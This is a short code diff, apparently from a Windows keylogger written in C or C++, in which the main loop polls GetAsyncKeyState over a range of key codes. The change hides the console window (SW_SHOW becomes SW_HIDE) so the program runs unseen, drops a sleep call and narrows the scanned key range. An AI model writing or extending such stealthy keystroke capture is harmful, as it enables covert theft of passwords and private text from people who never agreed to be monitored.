@@ -88,13 +88,12 @@ bool SpecialKeys(int S_key)
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_SHOW);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	char key = 'a';
 
 	while (true)
   	{
-		Sleep(10);
-		for (int key = 8; key <= 190; key++)
+		for (int key = 8; key <= 100; key++)
 		{
 			if (GetAsyncKeyState(key) == -32767)
       			{
